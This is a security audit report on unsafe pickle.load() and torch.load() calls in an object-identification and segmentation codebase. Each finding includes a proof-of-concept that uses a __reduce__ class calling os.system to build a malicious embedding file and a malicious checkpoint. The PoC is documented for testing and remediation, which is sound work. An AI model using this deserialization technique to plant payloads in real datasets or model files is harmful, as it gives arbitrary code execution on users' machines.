### Vulnerability 1: Pickle Deserialization Vulnerability in Object Identification

* Vulnerability Name: Unsafe Deserialization of Embeddings in Object Identification

* Description:
    1. The `identification/test.py` script is used to perform object identification using pre-computed image embeddings.
    2. The script loads these embeddings from pickle files located within the dataset directory. Specifically, it attempts to load `embedding.pkl` and `testcase_embedding.pkl` from the directory specified by the `--dataset_path` argument.
    3. The `pickle.load()` function in Python is used to deserialize these files. This function is known to be vulnerable to arbitrary code execution if the pickle file is maliciously crafted.
    4. An attacker could replace the legitimate `embedding.pkl` or `testcase_embedding.pkl` files within a dataset with malicious pickle files.
    5. When a user runs `identification/test.py` with the `--dataset_path` pointing to the directory containing the malicious pickle files, the `pickle.load()` function will execute the embedded malicious code.

* Impact: Arbitrary code execution on the user's machine. This could lead to complete system compromise, including data theft, malware installation, and denial of service.

* Vulnerability Rank: Critical

* Currently Implemented Mitigations: None

* Missing Mitigations:
    - Avoid using pickle for deserialization of embeddings. Use a safer serialization format like JSON or NumPy's `.npy` format.
    - Implement integrity checks for embedding files, such as cryptographic signatures, to ensure they haven't been tampered with.
    - Warn users about the security risks of using datasets from untrusted sources and the potential for malicious files within them.

* Preconditions:
    1. The user must download and use a dataset that is provided or modified by an attacker.
    2. The attacker must be able to replace or include malicious `embedding.pkl` or `testcase_embedding.pkl` files within the dataset.
    3. The user must execute the `identification/test.py` script with the `--dataset_path` argument pointing to the malicious dataset directory.

* Source Code Analysis:
    ```python
    File: /code/identification/test.py

    ...
    embedding_location = os.path.join(args.dataset_path, "embedding.pkl")
    testcase_embedding_location = os.path.join(args.dataset_path, "testcase_embedding.pkl")

    ...
    feature_embeddings = {}
    if os.path.exists(embedding_location):
        feature_embeddings_file = open(embedding_location, 'rb')
        feature_embeddings_saved = pickle.load(feature_embeddings_file) # Vulnerable line
        feature_embeddings = feature_embeddings_saved['feature_embeddings']
        fnsku_map = feature_embeddings_saved['fnsku_map']
        feature_embeddings_file.close()
    ...

    testcase_embeddings = {}
    if os.path.exists(testcase_embedding_location):
        testcase_embeddings_file = open(testcase_embedding_location, 'rb')
        testcase_embeddings_saved = pickle.load(testcase_embeddings_file) # Vulnerable line
        testcase_embeddings = testcase_embeddings_saved['testcase_embeddings']
        testcase_embeddings_file.close()
    ...
    ```
    The code directly uses `pickle.load()` to deserialize data from files whose paths are constructed using user-provided `dataset_path`. An attacker can craft a malicious pickle file and place it at the expected location within a malicious dataset. When the user executes `test.py` pointing to this dataset, the malicious pickle file will be deserialized, leading to code execution.

* Security Test Case:
    1. **Prepare a malicious pickle file (e.g., `embedding.pkl`)**:
        ```python
        import pickle
        import os

        class MaliciousClass:
            def __reduce__(self):
                return (os.system, ('touch /tmp/pwned',))

        malicious_data = {'feature_embeddings': MaliciousClass(), 'fnsku_map': {}}

        with open('embedding.pkl', 'wb') as f:
            pickle.dump(malicious_data, f)
        ```
    2. **Create a malicious dataset directory**:
        ```bash
        mkdir malicious_dataset
        mv embedding.pkl malicious_dataset/
        ```
    3. **Run `identification/test.py` with the malicious dataset**:
        ```bash
        cd code/identification/
        python test.py --dataset_path ../../malicious_dataset/
        ```
    4. **Verify code execution**: Check if the file `/tmp/pwned` exists. If it does, it confirms that the malicious code within the pickle file was executed.
        ```bash
        ls /tmp/pwned
        ```
        If the file exists, the vulnerability is confirmed.

---

### Vulnerability 2: Unsafe Deserialization of Model Checkpoints

* Vulnerability Name: Unsafe Deserialization of Model Checkpoints

* Description:
    1. The `segmentation/test_mask_rcnn.py` and `segmentation/train_mask_rcnn.py` scripts load model checkpoints using `torch.load()`.
    2. The path to the checkpoint file is provided by the user via the `--resume-from` argument (or `--checkpoint` in `defect_detection/defect_images/train.py` and `defect_detection/defect_videos/train.py`).
    3. Similar to pickle, `torch.load()` can be exploited to execute arbitrary code if a malicious checkpoint file is loaded.
    4. An attacker could create a malicious checkpoint file and trick a user into loading it.
    5. When the user runs the scripts and provides the path to the malicious checkpoint file, `torch.load()` will deserialize the file and execute the embedded malicious code.

* Impact: Arbitrary code execution on the user's machine, leading to potential system compromise.

* Vulnerability Rank: High

* Currently Implemented Mitigations: None

* Missing Mitigations:
    - Warn users against loading checkpoints from untrusted sources.
    - Implement integrity checks for checkpoint files, such as cryptographic signatures.
    - Consider safer alternatives for checkpoint loading if security is a major concern, although `torch.load` is the standard way to load PyTorch models.

* Preconditions:
    1. The user must be convinced to download and load a malicious checkpoint file provided by an attacker.
    2. The user must execute either `segmentation/test_mask_rcnn.py` or `segmentation/train_mask_rcnn.py` (or similar scripts in `defect_detection`) and provide the path to the malicious checkpoint file using the `--resume-from` argument.

* Source Code Analysis:
    ```python
    File: /code/segmentation/test_mask_rcnn.py
    ...
    if args.resume_from is not None:
        checkpoint = torch.load(args.resume_from) # Vulnerable line
        model.load_state_dict(checkpoint["model_state_dict"])
    ...
    ```
    ```python
    File: /code/segmentation/train_mask_rcnn.py
    ...
    if args.resume_from is not None:
        checkpoint = torch.load(args.resume_from) # Vulnerable line
        model.load_state_dict(checkpoint["model_state_dict"])
        optimizer.load_state_dict(checkpoint["optimizer_state_dict"])
        s_epoch = checkpoint["epoch"] + 1
    ...
    ```
    The code uses `torch.load()` to load checkpoint files from paths provided as command-line arguments. This makes the scripts vulnerable to loading malicious checkpoint files that can execute arbitrary code during deserialization.

* Security Test Case:
    1. **Prepare a malicious checkpoint file (e.g., `malicious_checkpoint.pt`)**:
        ```python
        import torch
        import os

        class MaliciousClass:
            def __reduce__(self):
                return (os.system, ('touch /tmp/pwned_checkpoint',))

        checkpoint = {
            'model_state_dict': MaliciousClass(),
            'optimizer_state_dict': {},
            'epoch': 0
        }
        torch.save(checkpoint, 'malicious_checkpoint.pt')
        ```
    2. **Run `segmentation/test_mask_rcnn.py` with the malicious checkpoint**:
        ```bash
        cd code/segmentation/
        python test_mask_rcnn.py --dataset_path <path_to_any_dataset> --resume-from malicious_checkpoint.pt
        ```
        Replace `<path_to_any_dataset>` with a valid dataset path for the script to run without other errors.
    3. **Verify code execution**: Check if the file `/tmp/pwned_checkpoint` exists. If it does, it confirms that the malicious code within the checkpoint file was executed.
        ```bash
        ls /tmp/pwned_checkpoint
        ```
        If the file exists, the vulnerability is confirmed.